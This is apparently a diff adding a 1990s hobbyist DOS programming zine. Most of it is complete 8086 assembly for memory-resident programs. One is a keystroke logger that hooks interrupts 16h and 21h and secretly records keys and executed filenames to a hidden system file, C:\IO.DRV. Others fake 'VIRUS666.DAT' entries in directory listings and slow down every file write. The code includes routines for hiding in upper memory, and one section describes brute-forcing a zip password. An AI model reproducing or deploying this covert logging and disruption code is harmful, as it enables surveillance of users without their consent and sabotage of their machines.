+        pop     es
+        cld
+        push    ds
+        xor     ax, ax
+        mov     ds, ax
+        mov     si, 1ch * 4
+        mov     di, offset oldint
+        cli
+        movsw
+        movsw
+        sti
+        pop     ds
+        ;let's see if we can load into upper memory...
+        mov     cx, offset initialize - offset thedata
+        shr     cx, 1
+        shr     cx, 1
+        shr     cx, 1
+        shr     cx, 1
+        inc     cx
+        mov     ax, cs
+        dec     ax
+        mov     es, ax
+        mov     ds:[100h], es
+keepgoing1:
+        mov     ax, es:[3]
+        mov     bx, es
+        add     ax, bx
+        inc     ax
+        mov     es, ax
+        cmp     byte ptr es:[0], 'M'
+        je      valid1
+        cmp     byte ptr es:[0], 'Z'
+        jne     failed
+        mov     ds:[100h], es
+valid1:
+        cmp     ax, 0a000h
+        jb      keepgoing1
+keepgoing2:
+        mov     al, es:[0]
+        cmp     al, 'M'
+        je      donevalidcheck
+        cmp     al, 'Z'
+        je      checkitout
+failed:
+        mov     es, ds:[100h]
+        jmp     short goresident
+
+failed2:
+        mov     es, ds:[100h]
+        mov     byte ptr ds:[100h], 'M'
+        mov     word ptr ds:[101h], 8
+        mov     ax, es
+        add     ax, es:[3]
+        inc     ax
+        mov     ds, ax
+        mov     bx, ds:[3]
+        push    cs
+        pop     ds
+        add     bx, cx
+        mov     ds:[103h], bx
+        sub     es:[3], cx
+        inc     cx
+        jmp     short goresident2
+
+donevalidcheck:
+        mov     ax, es
+        add     ax, es:[3]
+        inc     ax
+        mov     es, ax
+        jmp     short keepgoing2
+
+checkitout:
+        mov     ax, es:[1]
+        test    ax, ax
+        jnz     failed2
+        mov     ax, es:[3]
+        cmp     ax, cx
+        jb      failed2
+        ;we'll load into memory and hide
+goresident:
+        mov     byte ptr ds:[100h], 'H'
+        mov     word ptr ds:[101h], 7965h       ; 'ey' in memory
+        mov     word ptr ds:[103h], 2021h       ; '! ' in memory
+        inc     cx
+        sub     es:[3], cx
+goresident2:
+        mov     ax, es
+        add     ax, es:[3]
+        inc     ax
+        mov     es, ax
+        mov     si, 100h
+        xor     di, di
+        shl     cx, 1
+        shl     cx, 1
+        shl     cx, 1
+        rep     movsw
+        sub     ax, 10h
+        xor     bx, bx
+        mov     ds, bx
+        cli
+        mov     ds:[1ch * 4], offset tsr
+        mov     ds:[1ch * 4 + 2], ax
+        ;terminate
+        int     20h
+
+code    ends
+
+end     start
+
+<- - - - - - - - - - - - - - - - - CUT HERE - - - - - - - - - - - - - - - - ->
+
+------------------------------------------------------------------------------
+
+Keystroke recorder v3                                                     #006
+---------------------
+
+
+> What it does and how it works <
+
+This TSR records keystrokes from int 16h, and also any files executed via int
+21h/4Bh.  It places the keystrokes and the name and time/date of all EXEC
+requests in the hidden system file 'C:\IO.DRV'.  It waits until the buffer is
+full or some disk access is being done before dumping the contents of its
+buffer to the log file.  Here is the source code. . .
+
+<- - - - - - - - - - - - - - - - - CUT HERE - - - - - - - - - - - - - - - - ->
+
+.8086
+code    segment byte public
+        assume cs:code, ds:code
+        org     100h
+
+
+maxsize = 256
+
+start:
+        jmp     initialize
+        nop
+        nop
+        tag db 'phasm 11/97'            ;My tag :-)
+thedata:
+        oldint16        dw 0, 0         ;Old int 16h
+        oldint20        dw 0, 0         ;Old int 20h
+        oldint21        dw 0, 0         ;Old int 21h
+        buffer  db maxsize dup (0)      ;The buffer
+        buffersize      dw 0            ;Amount of data in buffer
+        dumpflag        db 0            ;Flag signalling dump request (buffer
+                                        ;  is full)
+        int21flag       db 0            ;Flag signalling int 21h in progress
+        filename        db 'C:\IO.DRV', 0       ;Name of dump file
+        taghead db '<*** Date/Time: '   ;This data is put in the log file when
+        themonth        db 'XX/'        ;A file is executed
+        theday  db 'XX/'
+        theyear db 'XX  '
+        thehour db 'XX:'
+        theminute       db 'XX:'
+        thesecond       db 'XX.'
+        thecentisecond  db 'XX  '
+        tagtail db ' ***>'
+endtag:
+
+tsr16:  ;used to record keys
+        pushf
+        test    ah, ah
+        jz      hook16                  ;Hook function 0
+        cmp     ah, 10h
+        je      hook16                  ;Hook function 10h
+        cmp     ah, 20h
+        je      hook16                  ;Hook function 20h
+exit16:
+        popf
+        jmp     dword ptr cs:[oldint16] ;No hook; continue int 16h
+
+hook16:
+        cmp     byte ptr cs:[dumpflag], 1       ;If buffer full. . .
+        je      exit16                          ;Don't log
+        call    dword ptr cs:[oldint16]         ;Do original int 16h
+        pushf
+        push    bp
+        mov     bp, sp
+        push    ax
+        mov     al, [bp + 9]
+        and     al, 00000010b
+        or      [bp + 3], al
+        mov     ax, [bp + 2]
+        mov     [bp + 8], ax    ;This code restores the original interrupt
+        pop     ax              ;Enable flag's status
+        pop     bp
+        popf
+        push    ax
+        push    bx
+        push    si
+        mov     bx, cs:[buffersize]
+        mov     si, offset buffer
+        mov     cs:[bx + si], al                ;Save the key
+        inc     word ptr cs:[buffersize]
+        test    al, al                          ;If not a special key,
+        jnz     testmax                         ;skip the next part
+        inc     si
+        mov     cs:[bx + si], ah                ;Store scan code
+        inc     word ptr cs:[buffersize]
+testmax:
+        cmp     word ptr cs:[buffersize], maxsize
+        jne     preparetoexit                   ;If buffer not at max, exit
+        cmp     byte ptr cs:[int21flag], 1      ;If int 21h in progress,
+        je      setdumpflag                     ;set the dump flag
+        call    bufferdump                      ;Dump the buffer
+        jmp     short preparetoexit
+
+setdumpflag:
+        mov     byte ptr cs:[dumpflag], 1       ;Request a buffer dump
+preparetoexit:
+        pop     si
+        pop     bx
+        pop     ax
+        iret                                    ;Exit to caller
+
+tsr20:  ;Used to trigger buffer dump
+        call    bufferdump                      ;Dump buffer
+        jmp     dword ptr cs:[oldint20]         ;Continue original handler
+
+tsr21:  ;Used to trigger buffer dump and record file executions
+        pushf
+        mov     byte ptr cs:[int21flag], 1      ;Signal int 21h in progress
+        cmp     byte ptr cs:[dumpflag], 1       ;Is a dump requested?
+        jne     checksubfunctions               ;If not, check subfunctions
+        call    bufferdump                      ;Dump buffer
+        cmp     ah, 4bh                         ;Is caller requesting EXEC?
+        jne     exit21                          ;If not, exit
+        call    recordexec                      ;If so, record name
+        jmp     short exit21                    ;Exit
+
+checksubfunctions:
+        test    ah, ah
+        jz      prepdump                ;00 : Terminate program
+        cmp     ah, 0fh
+        je      prepdump                ;0F : Open file (FCB)
+        cmp     ah, 13h
+        jb      exit21
+        cmp     ah, 16h
+        jbe     prepdump                ;13 : Delete file (FCB)
+                                        ;14 : Read from file (FCB)
+                                        ;15 : Write to file (FCB)
+                                        ;16 : Create file (FCB)
+        cmp     ah, 39h
+        je      prepdump                ;39 : Create subdirectory
+        cmp     ah, 3ah
+        je      prepdump                ;3A : Remove subdirectory
+        cmp     ah, 3ch
+        je      prepdump                ;3C : Create/Truncate file (handle)
+        cmp     ah, 3dh
+        je      prepdump                ;3D : Open file (handle)
+        cmp     ah, 3fh
+        je      checkhandle             ;3F : Read from file (handle)
+        cmp     ah, 40h
+        je      checkhandle             ;40 : Write to file (handle)
+        cmp     ah, 41h
+        je      prepdump                ;41 : Delete file (handle)
+        cmp     ah, 4bh
+        je      recordname              ;4B : Execute/Overlay
+        cmp     ah, 4ch
+        je      prepdump                ;4C : Terminate w/return code
+        cmp     ah, 6ch
+        jne     exit21                  ;6C : Extended open/create file
+prepdump:
+        call    bufferdump              ;Dump buffer
+exit21:
+        call    dword ptr cs:[oldint21] ;Do original int 21h
+        pushf
+        push    bp
+        mov     bp, sp
+        push    ax
+        mov     al, [bp + 9]
+        and     al, 00000010b
+        or      [bp + 3], al
+        mov     ax, [bp + 2]
+        mov     [bp + 8], ax    ;Save caller's interrupt enable flag status
+        pop     ax
+        pop     bp
+        popf
+        mov     byte ptr cs:[int21flag], 0      ;Reset int 21h progress flag
+        cmp     byte ptr cs:[dumpflag], 1       ;Is dump requested?
+        jne     iret21                          ;If not, exit
+        call    bufferdump                      ;Dump buffer
+iret21:
+        iret                                    ;Return to caller
+
+checkhandle:
+        cmp     bx, 4                           ;Is the handle standard?
+        ja      prepdump                        ;If not, go dump the buffer
+        jmp     short exit21                    ;If it is, exit
+
+recordname:
+        call    bufferdump                      ;Dump the buffer
+        call    recordexec                      ;Save the filename
+        jmp     short exit21                    ;Exit
+
+bufferdump      proc near
+        cmp     word ptr cs:[buffersize], 0     ;If the buffer is empty,
+        je      returnhome                      ;then don't bother
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        push    ds
+        push    cs
+        pop     ds
+        mov     ax, 3d01h                       ;Write access
+        mov     dx, offset filename
+        call    simint21                        ;Open the log file
+        jc      trymakingfile                   ;If error, create log file
+        jmp     short movetoend
+
+trymakingfile:
+        mov     ah, 3ch
+        mov     cx, 00100110b
+        call    simint21                        ;Create the file
+        jc      donerecording                   ;If error, abort
+movetoend:
+        mov     bx, ax
+        mov     ax, 4202h
+        xor     cx, cx
+        xor     dx, dx
+        call    simint21                        ;Move to the end of the file
+        mov     ah, 40h
+        mov     cx, [buffersize]
+        mov     dx, offset buffer
+        call    simint21                        ;Write the buffer
+        mov     ah, 3eh
+        call    simint21                        ;Close the buffer
+donerecording:
+        mov     byte ptr [dumpflag], 0          ;Reset the buffer full flag
+        mov     word ptr [buffersize], 0        ;Set the buffer size to 0
+        pop     ds
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+returnhome:
+        retn
+bufferdump      endp
+
+
+recordexec      proc near
+        ;push stuff
+        push    bp              ;[bp]
+        mov     bp, sp
+        push    ax              ;[bp - 2]
+        push    bx              ;[bp - 4]
+        push    cx              ;[bp - 6]
+        push    ds              ;[bp - 8]       ;Notice DS and DX are switched
+        push    dx              ;[bp - 10]
+        push    es              ;[bp - 12]
+        push    si              ;[bp - 14]
+        push    di              ;[bp - 16]
+        push    cs
+        pop     ds
+        mov     ax, 3d01h                       ;Write access
+        mov     dx, offset filename
+        call    simint21                        ;Open the log file
+        jc      trymakingfile2                  ;If error, create log file
+        jmp     short movetoend2
+
+trymakingfile2:
+        mov     ah, 3ch
+        mov     cx, 00100110b
+        call    simint21                        ;Create log file
+        jnc     movetoend2                      ;If no error, move ptr
+        jmp     donerecording2                  ;Abort
+
+movetoend2:
+        mov     bx, ax
+        mov     ax, 4202h
+        xor     cx, cx
+        xor     dx, dx
+        call    simint21                        ;Move ptr to end of file
+        mov     ah, 2ah
+        call    simint21                        ;Get system date
+        mov     al, dh
+        mov     si, offset themonth
+        call    writetwodigit                   ;Put month in buffer
+        mov     al, dl
+        mov     si, offset theday
+        call    writetwodigit                   ;Put day in buffer
+        sub     cx, 1900
+        cmp     cx, 100
+        jb      doitnow
+        sub     cx, 100
+doitnow:
+        mov     al, cl
+        mov     si, offset theyear
+        call    writetwodigit                   ;Put year in buffer
+        mov     ah, 2ch
+        call    simint21                        ;Get system time
+        mov     al, ch
+        mov     si, offset thehour
+        call    writetwodigit                   ;Put hour in buffer
+        mov     al, cl
+        mov     si, offset theminute
+        call    writetwodigit                   ;Put minutes in buffer
+        mov     al, dh
+        mov     si, offset thesecond
+        call    writetwodigit                   ;Put seconds in buffer
+        mov     al, dl
+        mov     si, offset thecentisecond
+        call    writetwodigit                   ;Put centiseconds in buffer
+        mov     ah, 40h
+        mov     cx, offset tagtail - offset taghead
+        mov     dx, offset taghead
+        call    simint21                        ;Write buffer
+        lds     dx, [bp - 10]
+        push    ds
+        pop     es
+        mov     di, dx
+        mov     cx, 0ffffh
+        cld
+        mov     al, 0
+        repne   scasb
+        inc     cx
+        mov     ah, 40h
+        not     cx                              ;Calculate length of filename
+        call    simint21                        ;Write filename
+        mov     cx, offset endtag - offset tagtail
+        mov     dx, offset tagtail
+        mov     ah, 40h
+        push    cs
+        pop     ds
+        call    simint21                        ;Write tail for EXEC logging
+        mov     ah, 3eh
+        call    simint21                        ;Close file
+donerecording2:
+        pop     di
+        pop     si
+        pop     es
+        pop     dx
+        pop     ds
+        pop     cx
+        pop     bx
+        pop     ax
+        pop     bp
+        retn
+recordexec      endp
+
+
+writetwodigit   proc near
+        push    ax
+        push    dx
+        mov     dl, 10
+        mov     ah, 0
+        div     dl                              ;Convert number to two digits
+        add     ax, 3030h
+        mov     [si], ax                        ;Save digits
+        pop     dx
+        pop     ax
+        retn
+writetwodigit   endp
+
+
+simint21        proc near
+        pushf
+        call    dword ptr cs:[oldint21]         ;Simulate INT 21h instruction
+        retn
+simint21        endp
+
+initialize:                                     ;Standard TSR engine
+        cld                                     ;See issue 001 for details
+        push    ds
+        xor     ax, ax
+        mov     ds, ax
+        mov     si, 16h * 4
+        mov     di, offset oldint16
+        cli
+        movsw
+        movsw
+        mov     si, 20h * 4
+        movsw
+        movsw
+        movsw
+        movsw
+        sti
+        pop     ds
+        ;let's see if we can load into upper memory...
+        mov     cx, offset initialize - offset thedata
+        shr     cx, 4
+        inc     cx
+        mov     ax, cs
+        dec     ax
+        mov     es, ax
+        mov     ds:[100h], es
+keepgoing1:
+        mov     ax, es:[3]
+        mov     bx, es
+        add     ax, bx
+        inc     ax
+        mov     es, ax
+        cmp     byte ptr es:[0], 'M'
+        je      valid1
+        cmp     byte ptr es:[0], 'Z'
+        jne     failed
+        mov     ds:[100h], es
+valid1:
+        cmp     ax, 0a000h
+        jb      keepgoing1
+keepgoing2:
+        mov     al, es:[0]
+        cmp     al, 'M'
+        je      donevalidcheck
+        cmp     al, 'Z'
+        je      checkitout
+failed:
+        mov     es, ds:[100h]
+        jmp     short goresident
+
+failed2:
+        mov     es, ds:[100h]
+        mov     byte ptr ds:[100h], 'M'
+        mov     word ptr ds:[101h], 8
+        mov     ax, es
+        add     ax, es:[3]
+        inc     ax
+        mov     ds, ax
+        mov     bx, ds:[3]
+        push    cs
+        pop     ds
+        add     bx, cx
+        mov     ds:[103h], bx
+        sub     es:[3], cx
+        inc     cx
+        jmp     short goresident2
+
+donevalidcheck:
+        mov     ax, es
+        add     ax, es:[3]
+        inc     ax
+        mov     es, ax
+        jmp     short keepgoing2
+
+checkitout:
+        mov     ax, es:[1]
+        test    ax, ax
+        jnz     failed2
+        mov     ax, es:[3]
+        cmp     ax, cx
+        jb      failed2
+        ;we'll load into memory and hide
+goresident:
+        mov     byte ptr ds:[100h], 'H'
+        mov     word ptr ds:[101h], 7965h       ; 'ey' in memory
+        mov     word ptr ds:[103h], 2021h       ; '! ' in memory
+        inc     cx
+        sub     es:[3], cx
+goresident2:
+        mov     ax, es
+        add     ax, es:[3]
+        inc     ax
+        mov     es, ax
+        mov     si, 100h
+        xor     di, di
+        shl     cx, 1
+        shl     cx, 1
+        shl     cx, 1
+        rep     movsw
+        sub     ax, 10h
+        xor     bx, bx
+        mov     ds, bx
+        cli
+        mov     ds:[16h * 4], offset tsr16
+        mov     ds:[16h * 4 + 2], ax
+        mov     ds:[20h * 4], offset tsr20
+        mov     ds:[20h * 4 + 2], ax
+        mov     ds:[21h * 4], offset tsr21
+        mov     ds:[21h * 4 + 2], ax
+        ;terminate
+        call    dword ptr cs:[oldint20]
+
+code    ends
+
+end     start
+
+<- - - - - - - - - - - - - - - - - CUT HERE - - - - - - - - - - - - - - - - ->
+
+------------------------------------------------------------------------------
+
+Phantom File TSR                                                          #007
+----------------
+
+
+> Introduction <
+
+As of the time I am writing this, I have not yet written this TSR.  The idea I
+am thinking of is a TSR that occasionally returns non-existant files during
+find first/next calls.  There are three sets of find first/next calls that can
+be intercepted.  There are FCBs, regular ASCIIZ filename calls, and Win95
+calls.  I won't cover the last one, since I don't have Win95 to test it on
+(I'll upgrade when I get a new hard drive, if that ever happens).  This
+shouldn't be a hard program to write.  I think that I won't intercept the
+initial find first call, because if I return a fake file name that time, then
+the find/next call that follows it will not have been initialized by the find
+first call.  The TSR will intercept Int 21/12 and Int 21/4F calls.  If the
+random number generator does not return the magic number, then control will be
+passed to the original Int21 handler.  If the magic number is returned, then a
+fake file will be passed back without ever calling the original Int21 handler.
+
+> More details <
+
+The Int 21/12 call points to an FCB which is used throughout the search.  The
+function returns an FCB containing the file set up in the DTA.  A pointer to
+the DTA can be obtained from Int 21/2F.  If the current drive is needed, this
+can be obtained from Int 21/19.  The attribute will always be 00.
+The Int 21/4F call is easy to spoof.  However, the Int 21/4E call must be
+intercepted so that the search attribute can be obtained.  This pair of calls
+returns more detailed information than Int 21/12.  The file's date, time, and
+size are returned.  Once again, the file's attributes will always be 00.
+
+> The source code <
+
+
+<- - - - - - - - - - - - - - - - - CUT HERE - - - - - - - - - - - - - - - - ->
+
+.8086
+code    segment byte public
+        assume cs:code, ds:code
+        org     100h
+
+sizelo = 02c2ah
+sizehi = 0ah                    ;Filesize = 666,666
+filetime = 30c3h                ;06:06:06
+filedate = 34c6h                ;06/06/2006
+odds = 50                       ;The probability is equal to 1 / odds
+
+start:
+        jmp     initialize
+        nop
+        nop
+        tag db 'phasm 12/97'
+
+thedata:
+        oldint  dw 0, 0
+
+tsr:
+        cmp     ah, 12h                 ;FCB find next
+        je      fcbfind
+        cmp     ah, 4fh                 ;ASCIIZ find next
+        je      asciizfind
+continuechain:
+        jmp     dword ptr cs:[oldint]   ;Continue int21 chain
+
+asciizfind:
+        push    ax
+        push    bx
+        push    dx                      ;Save registers
+        call    getrandom               ;Get a random number
+        mov     ax, bx
+        xor     dx, dx
+        mov     bx, odds
+        div     bx                      ;DX = random number 0 to odds - 1
+        test    dx, dx
+        jnz     noasciizfun             ;If DX not 0, then don't spoof
+        push    cx
+        push    ds
+        push    si
+        push    es
+        push    di                      ;Save more registers
+        mov     ah, 2fh
+        call    simint21                ;Get DTA address
+        lea     di, [bx + 15h]          ;Get offset of non-reserved area
+        mov     al, 0                   ;Attributes = 00
+        cld
+        stosb                           ;Save attribute
+        mov     ax, filetime
+        stosw                           ;Save file time
+        mov     ax, filedate
+        stosw                           ;Save file date
+        mov     ax, sizelo
+        stosw                           ;Save lo word of size
+        mov     ax, sizehi
+        stosw                           ;Save hi word of size
+        push    cs
+        pop     ds
+        mov     si, offset fakefile
+        mov     cx, 13
+        rep     movsb                   ;Move fake ASCIIZ filename
+        pop     di
+        pop     es
+        pop     si
+        pop     ds
+        pop     cx
+        pop     dx
+        pop     bx
+        pop     ax                      ;Restore registers
+        push    bp
+        mov     bp, sp
+        and     byte ptr [bp + 6], 0feh ;Clear carry flag
+        pop     bp
+        xor     ax, ax                  ;Not documented, but Int 21/4F
+                                        ;returns AX = 0 after successful call
+        iret
+
+noasciizfun:
+        pop     dx
+        pop     bx
+        pop     ax                      ;Restore registers
+        jmp     short continuechain     ;Continue int21 chain
+
+fcbfind:
+        push    ax              ;[bp + 6]
+        push    bx              ;[bp + 4]
+        push    dx              ;[bp + 2]       ;Save registers
+        call    getrandom               ;Get random number
+        mov     ax, bx
+        xor     dx, dx
+        mov     bx, odds
+        div     bx                      ;DX = random number 0 to odds - 1
+        test    dx, dx
+        jnz     nofcbfun                ;If DX not 0, then don't spoof
+        push    bp              ;[bp]
+        mov     bp, sp                  ;Set up stack frame
+        push    ds
+        push    si
+        push    es
+        push    di                      ;Save more registers
+        mov     ah, 2fh
+        call    simint21                ;Get DTA address
+        mov     si, [bp + 2]            ;Get old DX and put in SI
+        cmp     byte ptr [si], 0ffh     ;Is it an extended FCB?
+        jne     makeitfake              ;If not, skip next few instructions
+        mov     word ptr es:[bx], 00ffh ;Create extended FCB
+        mov     word ptr es:[bx + 2], 0
+        mov     word ptr es:[bx + 4], 0 ;Create reserved area
+        mov     byte ptr es:[bx + 6], 0 ;Save new attributes
+        add     bx, 7                   ;Shift FCB's offset so the next
+        add     si, 7                   ;routine can handle it like reg FCB
+makeitfake:
+        cld
+        mov     di, bx
+        mov     al, [si]
+        test    al, al                  ;Searching "default drive"?
+        jnz     savedrive               ;If not, skip next instructions
+        mov     ah, 19h
+        call    simint21                ;Get default drive
+        inc     al                      ;Adjust value
+savedrive:
+        stosb                           ;Save drive number
+        push    cs
+        pop     ds
+        mov     si, offset fakefile
+        movsw
+        movsw
+        movsw
+        movsw                           ;Move fake file's main name
+        inc     si
+        movsw
+        movsb                           ;Move fake file's extension
+        mov     al, 0
+        stosb                           ;Save fake attributes
+        add     di, 10
+        mov     ax, filetime
+        stosw                           ;Save fake time
+        mov     ax, filedate
+        stosw                           ;Save fake date
+        inc     di
+        inc     di
+        mov     ax, sizelo
+        stosw
+        mov     ax, sizehi
+        stosw                           ;Save fake file size
+        pop     di
+        pop     es
+        pop     si
+        pop     ds
+        pop     bp
+        pop     dx
+        pop     bx
+        pop     ax                      ;Restore registers
+        mov     al, 0                   ;Signal successful search
+        iret
+
+abortfcbfun:
+        pop     di
+        pop     es
+        pop     si
+        pop     ds
+        pop     bp
+nofcbfun:
+        pop     dx
+        pop     bx
+        pop     ax                      ;Restore registers
+        jmp     dword ptr cs:[oldint]   ;Continue int21 chain
+
+fakefile        db 'VIRUS666.DAT', 0    ;Fake filename
+
+
+simint21        proc near
+        pushf                           ;Push flags
+        call    dword ptr cs:[oldint]   ;FAR call to simulate INT call
+        retn
+simint21        endp
+
+
+;returns bx
+
+getrandom       proc near               ;My standard random number generator
+        push    ds
+        push    ax
+        push    cx
+        mov     ax, cs
+        mov     ds, ax
+        mov     ax, [seedhigh]
+        mov     bx, [seedlow]
+        not     ax
+        not     bx
+        ror     ax, 2
+        rol     bx, 1
+
+        xor     ax, [seedlow]
+        xor     bx, [seedhigh]
+
+        mov     cx, [counter]
+        ror     cx, cl
+        xor     cx, [counter]
+
+        adc     ax, cx
+        rol     bx, cl
+        mov     [seedhigh], ax
+        mov     [seedlow], bx
+        inc     word ptr [counter]
+        pop     cx
+        pop     ax
+        pop     ds
+        retn
+getrandom       endp
+
+seedhigh        dw      0
+seedlow         dw      0
+counter         dw      0
+
+
+initialize:                             ;And the standard TSR loader
+        call    initrandom              ;Initialize random number generator
+        cld
+        push    ds
+        xor     ax, ax
+        mov     ds, ax
+        mov     si, 21h * 4
+        mov     di, offset oldint
+        cli
+        movsw
+        movsw
+        sti
+        pop     ds
+        ;let's see if we can load into upper memory...
+        mov     cx, offset initialize - offset thedata
+        shr     cx, 4
+        inc     cx
+        mov     ax, cs
+        dec     ax
+        mov     es, ax
+        mov     ds:[100h], es
+keepgoing1:
+        mov     ax, es:[3]
+        mov     bx, es
+        add     ax, bx
+        inc     ax
+        mov     es, ax
+        cmp     byte ptr es:[0], 'M'
+        je      valid1
+        cmp     byte ptr es:[0], 'Z'
+        jne     failed
+        mov     ds:[100h], es
+valid1:
+        cmp     ax, 0a000h
+        jb      keepgoing1
+keepgoing2:
+        mov     al, es:[0]
+        cmp     al, 'M'
+        je      donevalidcheck
+        cmp     al, 'Z'
+        je      checkitout
+failed:
+        mov     es, ds:[100h]
+        jmp     short goresident
+
+failed2:
+        mov     es, ds:[100h]
+        mov     byte ptr ds:[100h], 'M'
+        mov     word ptr ds:[101h], 8
+        mov     ax, es
+        add     ax, es:[3]
+        inc     ax
+        mov     ds, ax
+        mov     bx, ds:[3]
+        push    cs
+        pop     ds
+        add     bx, cx
+        mov     ds:[103h], bx
+        sub     es:[3], cx
+        inc     cx
+        jmp     short goresident2
+
+donevalidcheck:
+        mov     ax, es
+        add     ax, es:[3]
+        inc     ax
+        mov     es, ax
+        jmp     short keepgoing2
+
+checkitout:
+        mov     ax, es:[1]
+        test    ax, ax
+        jnz     failed2
+        mov     ax, es:[3]
+        cmp     ax, cx
+        jb      failed2
+        ;we'll load into memory and hide
+goresident:
+        mov     byte ptr ds:[100h], 'H'
+        mov     word ptr ds:[101h], 7965h       ; 'ey' in memory
+        mov     word ptr ds:[103h], 2021h       ; '! ' in memory
+        inc     cx
+        sub     es:[3], cx
+goresident2:
+        mov     ax, es
+        add     ax, es:[3]
+        inc     ax
+        mov     es, ax
+        mov     si, 100h
+        xor     di, di
+        shl     cx, 1
+        shl     cx, 1
+        shl     cx, 1
+        rep     movsw
+        sub     ax, 10h
+        xor     bx, bx
+        mov     ds, bx
+        cli
+        mov     ds:[21h * 4], offset tsr
+        mov     ds:[21h * 4 + 2], ax
+        ;terminate
+        int     20h
+
+initrandom      proc near                       ;Initializer won't be TSRed
+        push    ax
+        push    cx
+        push    dx
+        xor     ah, ah
+        int     1ah
+        mov     cs:[seedhigh], cx
+        mov     cs:[seedlow], dx
+        pop     dx
+        pop     cx
+        pop     ax
+        retn
+initrandom      endp
+
+code    ends
+
+end     start
+
+<- - - - - - - - - - - - - - - - - CUT HERE - - - - - - - - - - - - - - - - ->
+
+------------------------------------------------------------------------------
+
+Slow Writer                                                               #008
+-----------
+
+
+> Introduction <
+
+This TSR hooks the DOS write-to-file function (AH = 40h) and breaks the write
+up into a series of 1 byte writes.  This seriously slows down any attempts to
+write to a file.  Only the main routine is shown here; the TSR engine is not
+included here (you can find it in several of the other articles).  The loader
+hooks int 21h, so you should be able to finish this.  Well, here's the source
+code.
+
+<- - - - - - - - - - - - - - - - - CUT HERE - - - - - - - - - - - - - - - - ->
+
+.8086
+code    segment byte public
+        assume cs:code, ds:code
+        org     100h
+
+start:
+        jmp     initialize
+        nop
+        nop
+        tag db 'phasm 12/97'
+
+thedata:
+        oldint  dw 0, 0
+
+tsr:
+        cmp     ah, 40h
+        jne     exittsr
+        push    cx
+        push    dx
+        push    si
+        push    di
+        mov     si, cx
+        mov     di, cx
+        mov     cx, 1
+looper:
+        test    si, si
+        jz      donewrite
+        pushf
+        call    dword ptr cs:[oldint]
+        jc      penny
+        dec     si
+        inc     dx
+        mov     ah,40h
+        jmp     short looper
+
+penny:
+        cmp     si, di
+        je      returnerror
+donewrite:
+        sub     di, si
+        mov     ax, di
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        clc
+        retf    2
+
+returnerror:
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        stc
+        retf    2
+
+exittsr:
+        jmp     dword ptr cs:[oldint]
+
+
+initialize:
+        ;Put the standard TSR engine here and hook Int 21h
+
+<- - - - - - - - - - - - - - - - - CUT HERE - - - - - - - - - - - - - - - - ->
+
+------------------------------------------------------------------------------
+
+Some thoughts on background processing                                    #009
+--------------------------------------
+
+
+Recently I helped a friend crack a zip file by taking the C source code for a
+zip cracker and rewriting it to guess passwords w/o a dictionary, and
+optimizing it with some assembly.  Cracking by guessing requires a lot of time
+to get anywhere, and it's annoying to have to sit and wait.  On my DX2/66
+using four character passwords, I got around 24,000 passwords guessed per
+second.  It sounded like a large number, but when compared to the number of
+possible passwords, it's pretty small.  I was using a 91 character set for
+guessing, so for four character passwords, there are 68,574,961 possible
+passwords, which would require around 47 minutes of computing.  For five
+character passwords there are 6,240,321,451 possible passwords, which works
+out to be over two straight days of number crunching.
+Eventually the password was cracked, but I later thought about making a TSR
+that sat in the background and worked out stuff like this.  It would take
+longer, but it would be a lot more convenient.  Such a program should not slow
+the computer down significantly, and should work both in Windows and DOS.
+What interrupts and services would it hook?  While in DOS, any key requests
+such as Int 16/00/10/20 can alternately do background computing and check if a
+key is ready.  Int 1C calls can be intercepted, and depending on your
+computer, you could specify how much time to spend computing during each clock
+tick.  Another possibility is that during DOS requests for characters or
+strings from the keyboard, the amount of computing done during Int 1C calls
+could be increased.  Periodically, the program could save its results so that
+if the computer crashed or was turned off without warning, it could pick up
+where it last left off.
+Anyway, I hope this has given someone some ideas.  I don't really plan on
+making such a program any time soon, because I usually don't need to do any
+background number crunching.  Maybe something besides number crunching could
+be done, such as searching for files, or tracking the amount of free space
+left.  I'm sure there's something useful to be done (gasp!).
